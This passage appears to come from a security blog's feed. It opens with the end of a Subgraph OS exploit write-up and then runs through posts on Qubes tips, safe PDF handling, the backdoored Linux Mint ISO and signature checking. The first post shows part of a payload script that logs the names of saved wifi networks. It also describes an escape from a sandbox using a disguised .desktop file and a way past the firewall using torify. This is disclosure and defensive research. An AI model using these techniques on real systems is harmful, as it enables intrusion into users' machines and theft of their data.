echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;

# Log list of saved wifi networks
echo &amp;quot;saved wifi networks:&amp;quot; &amp;gt;&amp;gt; $HOME/pwnlog.txt;
ls /etc/NetworkManager/system-connections &amp;gt;&amp;gt; $HOME/pwnlog.txt;
echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Using .desktop Files to Break Out of a Sandbox&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When you open a PDF in Subgraph OS, it opens an Evince oz sandbox that only has access to that one document. However, some sandboxes give you write access to an entire folder. For example, the Tor Browser sandbox lets you read and write to &lt;code&gt;~/Downloads/TorBrowser&lt;/code&gt;, and the LibreOffice sandbox lets you read and write to &lt;code&gt;~/Documents/LibreOffice&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you can get sandboxed remote code execution in one of these sandboxes, like by using a Tor Browser or LibreOffice exploit, you can then potentially escalate privileges to get unsandboxed remote code execution by modifying files in those directories.&lt;/p&gt;
&lt;p&gt;For example, lets say the user downloads a malicious Word document and double clicks it in Nautilus. Subgraph OS will open a LibreOffice oz sandbox and give it access to that document (let’s say, &lt;code&gt;~/Downloads/TorBrowser/resume.docx&lt;/code&gt;). Let’s also assume that the user has some legitimate documents, like maybe &lt;code&gt;~/Documents/LibreOffice/draft-proposal.odt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The payload of the malicious resume.docx could rename draft-proposal.odt to something else, like maybe make it a hidden file called &lt;code&gt;.DS_Store&lt;/code&gt;, and then create a new file, &lt;code&gt;draft-proposal.odt.desktop&lt;/code&gt; and make it executable. Later, when the user double-clicks what looks like &lt;code&gt;draft-proposal.odt&lt;/code&gt; in Nautilus, the attacker escapes the sandbox. (And of course, the payload can even clean up after itself — move &lt;code&gt;.DS_Store&lt;/code&gt; back to &lt;code&gt;draft-proprosal.odt&lt;/code&gt; and delete &lt;code&gt;draft-proposal.odt.desktop&lt;/code&gt;, after installing a backdoor of course.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bypassing the Subgraph Firewall&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Subgraph Firewall is pretty cool. It’s an application firewall that lets you approve or deny network connections on a process-by-process basis. As I showed in the video, when you open the GNOME Calculator app, it tries making network connections (to look up currency conversation rates), and but the firewall intercepts these and lets you deny them.&lt;/p&gt;
&lt;p&gt;However, it’s trivial to bypass because it allows all Tor traffic through, no questions asked. For example, if you open a terminal and run &lt;code&gt;curl example.com&lt;/code&gt;, the firewall intercepts this connection and gives you the option to deny it:&lt;/p&gt;
&lt;p&gt;&lt;img src="sgos_firewall1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;But if you run &lt;code&gt;torify curl example.com&lt;/code&gt;, it just works. If you check the payload above, you’ll see that all of the internet requests I made use torify to bypass the firewall.&lt;/p&gt;
&lt;p&gt;When I pointed this out to the Subgraph devs, they told me that the Subgraph Firewall wasn’t designed to prevent malware from making network connections, but rather just to prevent incidental privacy leaks (such as with the calculator). So they didn’t consider this a valid security issue.&lt;/p&gt;
&lt;p&gt;When they show off the Subgraph Firewall on their website, they neglected to explain this limitation:&lt;/p&gt;
&lt;p&gt;&lt;img src="subgraph_firewall.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;However, they do mention it in the Subgraph OS Handbook, but with questionable use of the word “sophisticated”:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Application firewalls are useful for monitoring unexpected connections from applications. For example, some applications may phone home to the vendor’s website. Often this activity is legitimate (non-malicious) but it still may violate the user’s privacy or expectations of how the software operates. Subgraph Firewall gives users the choice to allow or deny these connections.&lt;/p&gt;
&lt;p&gt;Malicious code may also phone home to a website or server that is operated by the hacker or malicious code author. Subgraph Firewall can also alert the user of these connections so that they can be denied.&lt;/p&gt;
&lt;p&gt;Application firewalls cannot prevent all malicious code from connecting to the Internet. &lt;strong&gt;Sophisticated malicious code can subvert the allowed connections to bypass the firewall.&lt;/strong&gt; However, the firewall may alert the user of connection attempts by less sophisticated malicious code&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;They did say that they will probably expand the scope and purpose of the firewall in the future — and they pointed to an &lt;a href="https://github.com/subgraph/fw-daemon/tree/socks-filter"&gt;incomplete branch&lt;/a&gt; of their firewall code that would allow intercepting Tor traffic to let the user deny it, some day when it’s done.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How this attack would affect Qubes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Qubes is flexible, so how much the attack succeeds depends on the user’s choices.&lt;/p&gt;
&lt;p&gt;In the worst case, the exploit would hack the sandbox (which is called an AppVM, in Qubes lingo) that the user opens it in. This could be their “personal” AppVM full of private data, or a “browser” AppVM that has nothing but a web browser profile, or it could be a &lt;a href="https://www.whonix.org/"&gt;Whonix&lt;/a&gt; AppVM, where all internet traffic is forced to go over Tor. In any of these cases, the attacker will be stuck in a sandbox and won’t be able to compromise other AppVMs. The attacker also won’t be able to query the hardware — they won’t be able to learn the network interface’s MAC address, or see nearby wifi access points or bluetooth devices, or anything like that. They won’t be able to access the microphone or webcam.&lt;/p&gt;
&lt;p&gt;However, some Qubes users are more careful than that. If the user right-clicks on the fake PDF .desktop and chooses “Open in DisposableVM”, the hack will fail. DisposableVMs are basically one-time-use sandboxes that work like this: a new sandbox gets created, the file gets copied into it (in this case, the malicious PDF .desktop file), the file gets opened, and when it’s done running, the entire sandbox is deleted. I just tested this out — for me, sgos_handbook.pdf.desktop actually just opens in Atom, a text editor I have installed.&lt;/p&gt;
&lt;p&gt;&lt;img src="subgraph_dispvm.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Even if the payload executes — like, for example, if this were actually a malicious PDF that exploits Evince instead of a &lt;code&gt;.desktop&lt;/code&gt; file, it wouldn’t have access to any user data. If the DisposableVM has internet access (which depends on the user’s settings), the payload might be able to phone home, but it won’t be able to tell the attacker anything besides “I’m stuck in a DisposableVM.” It certainly couldn’t take a snapshot from my webcam, record from my mic, or install any sort of persistent malware. And as soon the program closes, the whole sandbox gets deleted.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Final thoughts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Much of the Qubes vs. Subgraph OS debate has focused on the relative security of the two different types of sandboxing: the Xen hypervisor vs. grsecurity/Linux containers. Which is “more secure” is complicated and subjective.&lt;/p&gt;
&lt;p&gt;But what gets lost in the debate is the most important difference between the operating systems: Qubes provides &lt;strong&gt;security by compartmentalization&lt;/strong&gt;, while Subgraph OS provides &lt;strong&gt;OS hardening and app sandboxes&lt;/strong&gt;. As this exploit hopefully demonstrates, these are &lt;em&gt;not the same thing&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;It’s exciting to see an attempt at a security-hardened Linux distro, but it’s no substitute for the compartmentalization that’s made possible by Qubes.&lt;/p&gt;
&lt;p&gt;==&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Update April 12, 2017&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Subgraph &lt;a href="https://twitter.com/subgraph/status/851843464115441664"&gt;pointed out a typo&lt;/a&gt; in this blog post and &lt;a href="https://twitter.com/subgraph/status/851846268984987648"&gt;stated&lt;/a&gt; that this attack is possible because of an outstanding vulnerability in Nautilus. One Subgraph developer &lt;a href="https://twitter.com/bleidl/status/851849723002703873"&gt;claimed&lt;/a&gt; that this isn’t a bug in Subgraph OS, &lt;a href="https://twitter.com/bleidl/status/851851948710141952"&gt;said&lt;/a&gt; that Qubes was just as vulnerable (it’s &lt;a href="https://twitter.com/isislovecruft/status/851890009057710080"&gt;not&lt;/a&gt;), and &lt;a href="https://twitter.com/bleidl/status/851852258761465860"&gt;said&lt;/a&gt;, “Do I have to make a video too?” (please do!).&lt;/p&gt;
&lt;p&gt;But then last night, Subgraph &lt;a href="https://twitter.com/subgraph/status/852000407253594114"&gt;fixed&lt;/a&gt; this not-a-bug in Subgraph OS! Users can upgrade to it.&lt;/p&gt;
&lt;p&gt;&lt;img src="Screenshot_2017-04-12_12-29-49.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;I tested it out, and it works great (I can’t wait until this patch hits Debian and Fedora, too). I made this little animated GIF to show what &lt;code&gt;sgos_handbook.pdf.desktop&lt;/code&gt; now looks like in Nautilus. When it’s executable it still displays it as a &lt;code&gt;.desktop&lt;/code&gt; file, when you open it it displays a warning, and only if you click through the warning does it make it appear like a PDF:&lt;/p&gt;
&lt;p&gt;&lt;img src="nautilus.gif" alt=""&gt;&lt;/p&gt;
&lt;p&gt;This is excellent and fixes this specific issue, but it doesn’t fix the more fundamental problem that Subgraph OS has in trying to be an “adversary resistant OS”: Most software still doesn’t run inside of a sandbox. A future bug in Nautilus or other unsandboxed app (or tricking the target into installing a malicious &lt;code&gt;pip&lt;/code&gt; package you control, etc.) will still allow the attacker to take over the computer.&lt;/p&gt;
</content></entry><entry><title>Qubes Tip: Making Yubikey OpenPGP smart cards slightly more usable</title><link href="https://micahflee.com/2016/12/qubes-tip-making-yubikey-openpgp-smart-cards-slightly-more-usable/" rel="alternate"></link><updated>2016-12-01T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:17340d66-a8bb-3017-8ab3-a14562972466</id><content type="html">&lt;p&gt;Qubes 3.2 has support for &lt;a href="https://www.qubes-os.org/doc/usb/#attaching-a-single-usb-device-to-a-qube-usb-passthrough"&gt;USB passthrough&lt;/a&gt;. This one feature has made Qubes &lt;em&gt;so much&lt;/em&gt; more useful for me. It means that a wide variety of devices — from my laptop’s internal webcam, to plugging in smartphones to transfer data or do Android development — are finally supported. I used to have to use a separate non-Qubes computer for several tasks that I can now more conveniently and securely do within Qubes.&lt;/p&gt;
&lt;p&gt;One way that I use USB passthrough on a daily basis is with my Yubikey. (If you’re unfamiliar, Yubikeys are small USB devices that can be used for two-factor authentication, for storing and typing static passwords, and for OpenPGP smart cards.) Normally when you use GnuPG, you keep your secret key in a file stored in &lt;code&gt;~/.gnupg&lt;/code&gt;. If you use an OpenPGP smart card, you don’t have your secret key on your computer at all — instead you have it stored on your smart card. With a smart card you can use your secret key, by decrypting or signing messages, but it’s designed to be impossible to export the secret key itself.&lt;/p&gt;
&lt;p&gt;If you use the Qubes &lt;a href="https://www.qubes-os.org/doc/split-gpg/"&gt;split-gpg&lt;/a&gt; setup, where your email client is in a VM with internet access and your &lt;code&gt;~/.gnupg&lt;/code&gt; directory with all of your keys in a separate VM without any network access (called, for example, &lt;code&gt;gpgvm&lt;/code&gt;), you’re going to need to attach your Yubikey USB device to that VM every time you plug it in. And, because of how the &lt;code&gt;qvm-usb&lt;/code&gt; tool for USB passthrough works, the command you need to run to do this will be different depending on which USB port you plug your Yubikey into.&lt;/p&gt;
&lt;p&gt;To make things simpler for me, I wrote a script that I keep in &lt;code&gt;dom0&lt;/code&gt; at &lt;code&gt;/usr/local/bin/yubi&lt;/code&gt;. After I plug in my Yubikey, I press Alt-F2, type “yubi”, and press enter, and it attaches my Yubikey to my gpgvm. It doesn’t matter what USB port I’ve plugged my Yubikey into (it even works fine with USB hubs). If I run &lt;code&gt;yubi&lt;/code&gt; when my Yubikey is already attached to my &lt;code&gt;gpgvm&lt;/code&gt;, it detaches and then re-attaches it, which should clear up any problems. I thought I’d share it. Here’s the script:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
USB_DEVICE=`qvm-usb |grep Yubikey |cut -f1`

# Is it already attached
qvm-usb |grep $USB_DEVICE | grep "(attached to gpgvm)"
if [ $? -eq 0 ]; then
echo "detatching yubikey"
qvm-usb -d $USB_DEVICE
sleep 1
fi

echo "attaching yubikey"
qvm-usb -a gpgvm $USB_DEVICE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;One final note: When you plug your Yubikey into your computer (and you’re using a &lt;a href="https://www.qubes-os.org/doc/usb/#creating-and-using-a-usb-qube"&gt;USB qube&lt;/a&gt;), a question might pop up in a &lt;code&gt;dom0&lt;/code&gt; window asking if you’d like to allow the USB keyboard you plugged in to &lt;code&gt;sys-usb&lt;/code&gt; to type in &lt;code&gt;dom0&lt;/code&gt;. This is because Yubikeys advertise themselves as USB keyboards — this makes it possible to press the button on the Yubikey to type a two-factor authentication code.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-usb-question.png" alt="Qubes, protecting you from malicious USB devices pretending to be keyboards"&gt;&lt;/p&gt;
&lt;p&gt;After you run the yubi script, the same question in &lt;code&gt;dom0&lt;/code&gt; will pop up, but this time asking if you want to allow the keyboard from gpgvm to type in &lt;code&gt;dom0&lt;/code&gt;. You can customize how all of this works by editing the file &lt;code&gt;/etc/qubes-rpc/policy/qubes.InputKeyboard&lt;/code&gt; in &lt;code&gt;dom0&lt;/code&gt;. Here’s what mine looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gpgvm dom0 deny
$anyvm $anyvm ask
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This means never allow keyboards in gpgvm to type in dom0, and for all other situations ask.&lt;/p&gt;
</content></entry><entry><title>How Qubes makes handling PDFs way safer</title><link href="https://micahflee.com/2016/07/how-qubes-makes-handling-pdfs-way-safer/" rel="alternate"></link><updated>2016-07-21T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:c1c91f65-1f1f-30ec-8067-bd207d9b8a38</id><content type="html">&lt;p&gt;Bart Gellman asked me on Twitter how to make PDFs safe to open. This is an excellent question, especially for a Pulitzer-winning surveillance/national security reporter who needs to open documents from random people on the internet, who may be trying to hack him or may be a valuable new source. PDFs, and all other document formats, can be terribly dangerous, and opening a malicious one can let an attacker take over your computer.&lt;/p&gt;
&lt;p&gt;He was specifically asking if &lt;a href="https://firstlook.org/code/project/pdf-redact-tools/"&gt;PDF Redact Tools&lt;/a&gt;, a tool that I developed to securely redact documents, could be used in Tails to safely sanitize potentially-malicious PDFs before opening them. Yes you can, but Qubes offers some built-in tools that do a better job of this, in a safer manner, with less hassle, and that’s quicker and easier.&lt;/p&gt;
&lt;p&gt;The two key features are: “Open in Disposable VM” and “Convert to Trusted PDF”.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Open in Disposable VM&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In Qubes, you run all of your software in VMs, and its up to the user to decide how they want to do it. I have a VM called “email” that I use to check my email, and nothing else.&lt;/p&gt;
&lt;p&gt;Qubes comes with a Thunderbird extension that makes it simple to open email attachments in disposable VMs. It also comes with a file manager extension that lets you right-click on a file to open it in a disposable VM.&lt;/p&gt;
&lt;p&gt;It’s absurdly easy to use. I’ll use a sketchy piece of potentially-malicious spam to demonstrate:&lt;/p&gt;
&lt;p&gt;&lt;img src="sketchy-attachment.png" alt="sketchy attachment"&gt;&lt;/p&gt;
&lt;p&gt;Notice the window decorations of my Thunderbird window. It has a blue border (because that’s the color I chose) and says “[email]” in the window, to let me know that I’m running this program in my email VM.&lt;/p&gt;
&lt;p&gt;And here’s the window that opens:&lt;/p&gt;
&lt;p&gt;&lt;img src="sketchy-attachment-dispvm.png" alt="sketchy attachment DispVM"&gt;&lt;/p&gt;
&lt;p&gt;Here’s what happened:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Qubes created a brand new VM that doesn’t have any data in it at all&lt;/li&gt;
&lt;li&gt;Then it copied this file &lt;code&gt;AWARD NOTIFICATION.pdf&lt;/code&gt; to this new VM&lt;/li&gt;
&lt;li&gt;Then it opened the PDF in the new VM&lt;/li&gt;
&lt;li&gt;When I closed the window, Qubes deleted that disposable VM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Check the window title. This PDF is open in a VM called “disp11”. When I close the window, the VM shuts down and gets deleted. If the PDF were malicious and tried to hack me, and the hack successfully exploited my PDF reader (Evince, in this case), it would still fail. The exploit wouldn’t have access to any of my data at all, and as soon as I closed the window it would be deleted forever.&lt;/p&gt;
&lt;p&gt;There’s a setting in the Qubes Thunderbird extension to open all email attachments in disposable VMs. And this works with any type of document, not just PDFs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Convert to Trusted PDF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Qubes also has a feature that’s similar to what Bart was wanting to use PDF Redact Tools for: to convert an unknown PDF into one that you can safely open on any computer, even one running Windows or OS X with a vulnerable version of Adobe Reader.&lt;/p&gt;
&lt;p&gt;In this example, I’ve downloaded a PDF from Cryptome, and I have no idea if it’s malicious or not. I could choose to just open it in my PDF reader, to open it in a disposable VM, or to convert it to a PDF that I can trust.&lt;/p&gt;
&lt;p&gt;&lt;img src="trusted-pdf.png" alt="trusted pdf"&gt;&lt;/p&gt;
&lt;p&gt;First, notice the window decorations. This is the file manager running in my “browser” VM, and I chose the window color yellow.&lt;/p&gt;
&lt;p&gt;Right-clicking on the PDF and choosing “Convert To Trusted PDF” does something similar to what PDF Redact Tools does, but it will do it in a more secure way, because it can, because it’s running in Qubes. The short version is this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Qubes creates a new disposable VM&lt;/li&gt;
&lt;li&gt;It copies the document &lt;code&gt;fbi-cia-ssci-saudi.pdf&lt;/code&gt; to it&lt;/li&gt;
&lt;li&gt;It does a complicated process to flatten and remove anything malicious from the PDF (it does a better job than PDF Redact Tools, which simply runs the ImageMagick “convert” tool, meaning that a PDF especially crafted to attack ImageMagick rather than Adobe Reader could still hack your computer)&lt;/li&gt;
&lt;li&gt;It copies the trusted PDF back to the VM&lt;/li&gt;
&lt;li&gt;It moves the original PDF to &lt;code&gt;~/QubesUntrustedPDFs&lt;/code&gt; in the VM you’re using (browser, in my case), and it names the trusted PDF &lt;code&gt;fbi-cia-ssci-saudi.trusted.pdf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you want a much more detailed explanation of what’s going on, check out Joanna Rutkowska’s &lt;a href="https://theinvisiblethings.blogspot.com/2013/02/converting-untrusted-pdfs-into-trusted.html"&gt;blog post on the topic&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There are two annoying downsides that trusted PDFs have: In order to make it safe, Qubes completely flattens the PDF, which means means you can no longer select any text from it. You’ll have to OCR it if you want the text layer back. And it makes the file size bigger, sometimes much bigger. The original &lt;code&gt;fbi-cia-ssci-saudi.pdf&lt;/code&gt; is 624 kb, but &lt;code&gt;fbi-cia-ssci-saudi.trusted.pdf&lt;/code&gt; is 2.3 mb.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Update:&lt;/em&gt; There’s a &lt;a href="https://groups.google.com/forum/#!topic/qubes-users/qSiLD4jTXtQ"&gt;minor correction&lt;/a&gt; from Qubes developer Marek Marczykowski-Górecki:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;“It copies the trusted PDF back to the VM” – that  would mean that compromised DispVM (by the very same PDF) could pass it back unmodified instead of the sanitized one. It isn’t what is done there – it pass only very simple representation of the file (bitmap in this case), then reassemble PDF in the calling VM.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;You can still get hacked with Qubes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;These Qubes features are awesome and will protect you from just about 100% of random drive-by attacks. But like everything on computers, it’s still possible for an attacker with the right exploits to hack you, even if you’re using Qubes.&lt;/p&gt;
&lt;p&gt;They would need:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;An exploit for the program you’re using to open the document. In Qubes, the default PDF reader is Evince, but you can obviously use whichever software you think is safest.&lt;/li&gt;
&lt;li&gt;An exploit for Xen, which is the hypervisor that Qubes uses. These exploits are rare, but certainly happen. (Like this recent incredibly scary one.)&lt;/li&gt;
&lt;li&gt;A payload that’s specifically targeted against Qubes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Qubes developers are completely on top of security updates. If you keep dom0 and all of your template VMs always up-to-date, using disposable VMs and converting to trusted PDFs will protect you from all but the most persistent and resourced attackers.&lt;/p&gt;
</content></entry><entry><title>Qubes Tip: Opening links in your preferred AppVM</title><link href="https://micahflee.com/2016/06/qubes-tip-opening-links-in-your-preferred-appvm/" rel="alternate"></link><updated>2016-06-22T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:59924677-ba0f-3872-83a2-f7118b79489e</id><content type="html">&lt;p&gt;If you use Qubes like I do, you have many different AppVMs to compartmentalize different programs. You might have one VM for your email client, one for your jabber client, one for your password database. But if you click a link in any of these programs, it sure would be nice if that link opened in the browser VM of your choice. This isn’t all that hard to setup.&lt;/p&gt;
&lt;p&gt;The command &lt;code&gt;qvm-open-in-vm&lt;/code&gt; lets you open a document or a URL in another VM.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user@dev:~$ qvm-open-in-vm
Usage: /usr/bin/qvm-open-in-vm vmname filename
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you have a terminal open in your dev VM and want to load &lt;a href="https://micahflee.com/"&gt;https://micahflee.com/&lt;/a&gt; in your browser VM, you can do it like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user@dev:~$ qvm-open-in-vm browser https://micahflee.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You get a prompt in &lt;code&gt;dom0&lt;/code&gt; asking if you really want to allow this cross-VM behavior. When you choose yes, a new tab loading my website opens in your default browser in your browser VM.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes-links.png" alt="qubes.OpenURL"&gt;&lt;/p&gt;
&lt;p&gt;Excellent. Now let’s say you want this to automatically happen every time you click any link. You can do this by creating a &lt;code&gt;.desktop&lt;/code&gt; file that advertises itself as a handler for http/https links, and then setting this as your default browser.&lt;/p&gt;
&lt;p&gt;Open a text editor and copy and paste this into it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Desktop Entry]
Encoding=UTF-8
Name=BrowserVM
Exec=qvm-open-in-vm browser %u
Terminal=false
X-MultipleArgs=false
Type=Application
Categories=Network;WebBrowser;
MimeType=x-scheme-handler/unknown;x-scheme-handler/about;text/html;text/xml;application/xhtml+xml;application/xml;application/vnd.mozilla.xul+xml;application/rss+xml;application/rdf+xml;image/gif;image/jpeg;image/png;x-scheme-handler/http;x-scheme-handler/https;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Replace browser in the line that says &lt;code&gt;Exec=qvm-open-in-vm browser %u&lt;/code&gt; with whatever AppVM you want to open links in. Save this file to &lt;code&gt;~/.local/share/applications/browser_vm.desktop&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Finally, set it as your default browser (like I’m doing here in my email VM):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user@email:~$ xdg-settings set default-web-browser browser_vm.desktop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now whenever you click a link in a program running in this VM (such as Thunderbird), it will open that link in your browser VM.&lt;/p&gt;
</content></entry><entry><title>Backdoored Linux Mint, and the Perils of Checksums</title><link href="https://micahflee.com/2016/02/backdoored-linux-mint-and-the-perils-of-checksums/" rel="alternate"></link><updated>2016-02-20T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:952e55f9-d543-32ce-b70f-e06eb2424573</id><content type="html">&lt;p&gt;Someone hacked the website of Linux Mint — which, according to &lt;a href="https://stats.wikimedia.org/wikimedia/squids/SquidReportOperatingSystems.htm"&gt;Wikipedia’s traffic analysis report&lt;/a&gt; is the 3rd most popular desktop Linux distribution after Ubuntu and Fedora — and replaced links to ISO downloads with a backdoored version of the operating system. This &lt;a href="http://blog.linuxmint.com/?p=2994"&gt;blog post&lt;/a&gt; explains the situation.&lt;/p&gt;
&lt;p&gt;From the post and comments, the key points includes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Links to the malicious version of the ISO were added, detected, and removed on the same day, February 20. If you’re already running Linux Mint, this doesn’t affect you — all files installed or updated using the package manager are digitally signed and the signatures are verified.&lt;/li&gt;
&lt;li&gt;Linux Mint 17.3 Cinnamon was the only version that was compromised&lt;/li&gt;
&lt;li&gt;The website was hacked because of a WordPress exploit. Project leader Clement Lefebvre says, “Yes, the breach was made via wordpress. From there they got a www-data shell.”&lt;/li&gt;
&lt;li&gt;The backdoored ISO contains Linux Mint with &lt;a href="http://blog.malwaremustdie.org/2013/05/story-of-unix-trojan-tsunami-ircbot-w.html"&gt;Tsunami botnet malware&lt;/a&gt; running on it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The blog post includes instructions for checking your ISO files to ensure that they’re valid by comparing MD5 checksums. MD5 checksums!&lt;/p&gt;
&lt;p&gt;Besides the fact that the website isn’t available over HTTPS so network attackers could change those MD5 checksums to whatever they want as you load the blog post, &lt;a href="https://en.wikipedia.org/wiki/MD5#Security"&gt;MD5 is entirely broken&lt;/a&gt; and has been for many years. MD5 should never be relied on for verifying that you have the legitimate version of a file. It would not be difficult for someone to generate a backdoored Linux Mint ISO that has the same MD5 checksum as the legitimate ISO. Likewise, while SHA1 is considerable stronger, it also should not be used for security purposes anymore. Wikipedia’s &lt;a href="https://en.wikipedia.org/wiki/SHA-1"&gt;SHA1 article&lt;/a&gt; says: “SHA-1 is no longer considered secure against well-funded opponent.”&lt;/p&gt;
&lt;p&gt;It would be great if the Linux Mint project can completely stop relying on MD5 and started using a checksum algorithm that is considered secure today, like SHA256.&lt;/p&gt;
&lt;p&gt;But it’s also important to note that comparing the checksum of a file you downloaded with what you see on the website you downloaded it from isn’t secure either, even if you are using SHA256. If a hacker can hack the website to modify the download link, they can modify the checksum at the same time to match their malicious download.&lt;/p&gt;
&lt;p&gt;The only solution to this problem is to use public key cryptography. The ISOs should be digitally signed with an OpenPGP secret key, and users should verify the signature using the associated public key. Linux Mint actually does in fact sign releases with a PGP key, but there’s no information on the download page about this, or how to go about verifying the signature.&lt;/p&gt;
&lt;p&gt;If you look at the directory structure in the Linux Mint folder on one of the download mirrors, like &lt;a href="http://mirrors.kernel.org/linuxmint/stable/17.3/"&gt;http://mirrors.kernel.org/linuxmint/stable/17.3/&lt;/a&gt; for example, you’ll see a bunch of ISO files as well as sha256sum.txt and sha256sum.txt.gpg. The sha256sum.txt file includes SHA256 checksums of all of the ISO files, and you can use sha256sum.txt.gpg to verify the signature of that file.&lt;/p&gt;
&lt;p&gt;This appears to be the signing key:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub   dsa1024/0FF405B2 2009-04-29 [SC]
      Key fingerprint = E1A3 8B8F 1446 75D0 60EA  666F 3EE6 7F3D 0FF4 05B2
uid         [ unknown] Clement Lefebvre (Linux Mint Package Repository v1) 
sub   elg2048/0F346519 2009-04-29 [E]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verifying is PGP signatures is more complicated and harder to explain than comparing checksums, but it’s actually secure. It’s the only way to be sure that a Linux installer ISO you download hasn’t been tampered with since the image was built by the developers. Tails is an example of an operating system that does an &lt;a href="https://tails.boum.org/download/index.en.html#verify"&gt;excellent job&lt;/a&gt; at explaining how to verify PGP signatures when you download their ISO.&lt;/p&gt;
</content></entry><entry><title>Usable Crypto Capture the Flag Challenge</title><link href="https://micahflee.com/2016/02/usable-crypto-capture-the-flag-challenge/" rel="alternate"></link><updated>2016-02-06T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:f468d2a1-43ff-3503-8957-69883fc36517</id><content type="html">&lt;p&gt;Last week, during USENIX’s first &lt;a href="https://www.usenix.org/conference/enigma2016"&gt;Enigma conference&lt;/a&gt;, EFF hosted a small Capture the Flag hacking competition. I designed one of the challenges myself, entitled Usable Crypto. It requires you to use PGP as an attacker rather than a defender. It’s on the easy side, as far as CTF challenges go, and I think many people who have absolutely no hacking skills but some fumbling-around-with-PGP skills could beat it without too much trouble. And it might even demonstrate why verifying fingerprints really is rather important.&lt;/p&gt;
&lt;p&gt;If you’d like to give it a go, it’s live at &lt;a href="https://usable-crypto.ctf.micahflee.com/"&gt;https://usable-crypto.ctf.micahflee.com/&lt;/a&gt;. The plot for Enigma’s CTF was loosely based off of Cory Doctorow’s novel Little Brother. You’re an X-NET hacker fighting the surveillance state’s Department of National Security. You win when you capture the flag, which is a string of text that starts with “FLAG_” (but please don’t post it in the comments).&lt;/p&gt;
</content></entry><entry><title>Hardening Debian for the Desktop Using Grsecurity</title><link href="https://micahflee.com/2016/01/debian-grsecurity/" rel="alternate"></link><updated>2016-01-15T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:88c4053a-7027-3e0d-a912-ac6a237d4cde</id><content type="html">&lt;p&gt;I recently built a desktop system that I think is reasonably secure. It’s running Debian sid, also known as “unstable” — though in the Debian desktop world that just means you get to use the newest software. It’s just about as stable as “stable”, and besides, #yolo. It’s also running a &lt;a href="https://grsecurity.net/"&gt;grsecurity&lt;/a&gt;-patched Linux kernel and &lt;a href="https://en.wikipedia.org/wiki/Grsecurity#PaX"&gt;PaX&lt;/a&gt;, technologies that make Linux way more secure. Grsecurity protects you against memory corruption attacks, such as buffer overflows.&lt;/p&gt;
&lt;p&gt;Last October I traveled to Moscow and &lt;a href="https://theintercept.com/2015/11/12/edward-snowden-explains-how-to-reclaim-your-privacy/"&gt;interviewed Edward Snowden&lt;/a&gt;. Here’s one of the things he told me:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;“Something that we haven’t seen that we need to see is a greater hardening of the overall kernels of every operating system through things like grsecurity, but unfortunately there’s a big usability gap between the capabilities that are out there, that are possible, and what is attainable for the average user.”&lt;/p&gt;
&lt;/blockquote&gt;
